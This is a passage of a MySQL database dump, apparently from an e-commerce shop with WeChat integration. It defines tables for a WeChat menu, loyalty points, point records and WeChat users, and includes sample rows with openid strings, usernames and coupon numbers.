INSERT INTO `ec22703249_weixin_menu` VALUES ('55', '签到', '1', '', 'qiandao', '', '1', '0', '40');

-- ----------------------------
-- Table structure for `ec22703249_weixin_point`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_point`;
CREATE TABLE `ec22703249_weixin_point` (
  `point_id` int(3) unsigned NOT NULL AUTO_INCREMENT,
  `point_name` varchar(64) NOT NULL DEFAULT '',
  `point_value` int(3) unsigned NOT NULL,
  `point_num` int(3) NOT NULL,
  `autoload` varchar(20) NOT NULL DEFAULT 'yes',
  PRIMARY KEY (`point_id`),
  UNIQUE KEY `option_name` (`point_name`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_point
-- ----------------------------
INSERT INTO `ec22703249_weixin_point` VALUES ('1', 'new', '10', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('2', 'best', '10', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('3', 'hot', '10', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('4', 'cxbd', '10', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('5', 'ddcx', '10', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('6', 'kdcx', '10', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('8', 'qiandao', '20', '1', 'yes');
INSERT INTO `ec22703249_weixin_point` VALUES ('11', 'promote', '10', '1', 'yes');

-- ----------------------------
-- Table structure for `ec22703249_weixin_point_record`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_point_record`;
CREATE TABLE `ec22703249_weixin_point_record` (
  `pr_id` int(7) NOT NULL AUTO_INCREMENT,
  `wxid` char(28) NOT NULL,
  `point_name` varchar(64) NOT NULL,
  `num` int(5) NOT NULL,
  `lasttime` int(10) NOT NULL,
  `datelinie` int(10) NOT NULL,
  PRIMARY KEY (`pr_id`)
) ENGINE=MyISAM AUTO_INCREMENT=23 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_point_record
-- ----------------------------
INSERT INTO `ec22703249_weixin_point_record` VALUES ('10', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'qiandao', '5', '1398478404', '1398431460');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('11', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'best', '6', '1398479714', '1398431608');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('12', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'hot', '4', '1398479389', '1398431616');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('13', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'promote', '4', '1398435826', '1398432317');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('14', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'new', '3', '1398435862', '1398434130');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('15', 'oKIVft-We_6U2Lxak40Ht9jTmMKc', 'promote', '2', '1398486013', '1398436227');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('16', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'ddcx', '2', '1398478572', '1398440053');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('17', 'oKIVft-swX4_pRDyWpN5VmswPZlE', 'kdcx', '2', '1398478601', '1398442335');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('18', 'oKIVftyTI_air21Gqu1I-FhkW_9Y', 'promote', '1', '1398442694', '1398442694');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('19', 'oKIVftyTI_air21Gqu1I-FhkW_9Y', 'new', '1', '1398442792', '1398442792');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('20', 'oKIVft-We_6U2Lxak40Ht9jTmMKc', 'qiandao', '2', '1398501760', '1398486037');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('21', 'oKIVft-We_6U2Lxak40Ht9jTmMKc', 'ddcx', '1', '1398487820', '1398487820');
INSERT INTO `ec22703249_weixin_point_record` VALUES ('22', 'oKIVft-We_6U2Lxak40Ht9jTmMKc', 'hot', '1', '1398501782', '1398501782');

-- ----------------------------
-- Table structure for `ec22703249_weixin_user`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_weixin_user`;
CREATE TABLE `ec22703249_weixin_user` (
  `uid` int(7) NOT NULL AUTO_INCREMENT,
  `subscribe` tinyint(1) unsigned NOT NULL,
  `wxid` char(28) NOT NULL,
  `nickname` varchar(200) NOT NULL,
  `sex` tinyint(1) unsigned NOT NULL,
  `city` varchar(100) NOT NULL,
  `country` varchar(100) NOT NULL,
  `province` varchar(100) NOT NULL,
  `language` varchar(50) NOT NULL,
  `headimgurl` varchar(200) NOT NULL,
  `subscribe_time` int(10) unsigned NOT NULL,
  `localimgurl` varchar(200) NOT NULL,
  `setp` smallint(2) unsigned NOT NULL,
  `uname` varchar(50) NOT NULL,
  `coupon` varchar(30) NOT NULL,
  PRIMARY KEY (`uid`)
) ENGINE=MyISAM AUTO_INCREMENT=355 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_weixin_user
-- ----------------------------
INSERT INTO `ec22703249_weixin_user` VALUES ('340', '0', 'oKIVft-swX4_pRDyWpN5VmswPZlE', '', '0', '', '', '', '', '', '0', '', '3', 'sclzz', '1000013001');
INSERT INTO `ec22703249_weixin_user` VALUES ('337', '0', 'oKIVft02ugRp0vX0XTkfJkXO_gs8', '', '0', '', '', '', '', '', '0', '', '0', '', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('338', '0', 'oKIVft-We_6U2Lxak40Ht9jTmMKc', '', '0', '', '', '', '', '', '0', '', '3', 'weixin322', '1000020700');
INSERT INTO `ec22703249_weixin_user` VALUES ('339', '0', 'oKIVftyTI_air21Gqu1I-FhkW_9Y', '', '0', '', '', '', '', '', '0', '', '3', 'weixin339', '1000005399');
INSERT INTO `ec22703249_weixin_user` VALUES ('341', '0', 'oKIVft8XNakdy6x-4C-YlK_hKcrk', '', '0', '', '', '', '', '', '0', '', '0', '', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('342', '0', 'oKIVft4Hk9gNczpAyszvsIYeGklU', '', '0', '', '', '', '', '', '0', '', '0', '', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('343', '0', 'oTTbujq1UOb9KUi5WTJyeMaDa9QU', '', '0', '', '', '', '', '', '0', '', '0', '', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('344', '0', 'oTTbujj5QMLaD8BjoFp0i5BYTLvc', '', '0', '', '', '', '', '', '0', '', '3', 'weixin344', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('345', '0', 'oTTbujl50N2pQagzI-8PD969p2qM', '', '0', '', '', '', '', '', '0', '', '3', 'weixin345', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('346', '0', 'oTTbujjRiy7iLajRPcfImPTb1Mks', '', '0', '', '', '', '', '', '0', '', '3', 'weixin346', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('347', '0', 'oTTbujtfNKD9r_sC0sQ864GGTFa4', '', '0', '', '', '', '', '', '0', '', '3', 'weixin347', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('348', '0', 'oTTbujpyehKfcv98v54k6ameqKQs', '', '0', '', '', '', '', '', '0', '', '3', 'weixin348', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('349', '0', 'oTTbujkgDssHXr3vf-q8493t3KtU', '', '0', '', '', '', '', '', '0', '', '3', 'weixin349', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('350', '0', 'oTTbujtCxgwfE33UX0OD0JvRbOuk', '', '0', '', '', '', '', '', '0', '', '3', 'weixin350', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('351', '0', 'oTTbujsC_aA684Gjx0cyOsORsxR8', '', '0', '', '', '', '', '', '0', '', '3', 'weixin351', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('352', '0', 'oTTbujttR8mP5CfGo0_VzUIMpc-E', '', '0', '', '', '', '', '', '0', '', '3', 'weixin352', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('353', '0', 'oTTbujm6E6xGRx-B9Y170TYHDEGA', '', '0', '', '', '', '', '', '0', '', '3', 'weixin353', '');
INSERT INTO `ec22703249_weixin_user` VALUES ('354', '0', 'oTTbujsMY7_sD5oAhVSpE-yFikjc', '', '0', '', '', '', '', '', '0', '', '3', 'weixin354', '');

-- ----------------------------
-- Table structure for `ec22703249_wholesale`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_wholesale`;
CREATE TABLE `ec22703249_wholesale` (
  `act_id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `goods_id` mediumint(8) unsigned NOT NULL,
  `goods_name` varchar(255) NOT NULL,
  `rank_ids` varchar(255) NOT NULL,
  `prices` text NOT NULL,
  `enabled` tinyint(3) unsigned NOT NULL,
  PRIMARY KEY (`act_id`),
  KEY `goods_id` (`goods_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_wholesale
-- ----------------------------

-- ----------------------------
-- Table structure for `ec22703249_zxcomment`
-- ----------------------------
DROP TABLE IF EXISTS `ec22703249_zxcomment`;
CREATE TABLE `ec22703249_zxcomment` (
  `comment_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `comment_type` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `id_value` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `email` varchar(60) NOT NULL DEFAULT '',
  `user_name` varchar(60) NOT NULL DEFAULT '',
  `content` text NOT NULL,
  `comment_rank` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `add_time` int(10) unsigned NOT NULL DEFAULT '0',
  `ip_address` varchar(15) NOT NULL DEFAULT '',
  `status` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `user_id` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`comment_id`),
  KEY `parent_id` (`parent_id`),
  KEY `id_value` (`id_value`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of ec22703249_zxcomment
-- ----------------------------
